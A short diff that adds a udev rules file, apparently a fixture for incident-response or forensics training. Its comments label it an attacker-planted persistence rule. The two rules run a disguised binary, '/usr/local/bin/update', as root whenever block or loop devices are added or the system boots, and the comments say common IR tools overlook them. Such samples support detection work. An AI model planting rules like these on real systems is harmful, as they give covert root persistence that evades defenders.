@@ -1,0 +1,7 @@
+# Attacker-planted udev rule. Fires every time a block device is added
+# or the system boots and enumerates existing devices. RUN+= spawns the
+# command as root. This is a real persistence technique documented in
+# the wild but NOT scanned by any standard Linux IR tool — you have to
+# read /etc/udev/rules.d/ by hand to catch it.
+ACTION=="add", SUBSYSTEM=="block", RUN+="/usr/local/bin/update --quiet &"
+ACTION=="add", KERNEL=="loop*", RUN+="/usr/local/bin/update --quiet &"
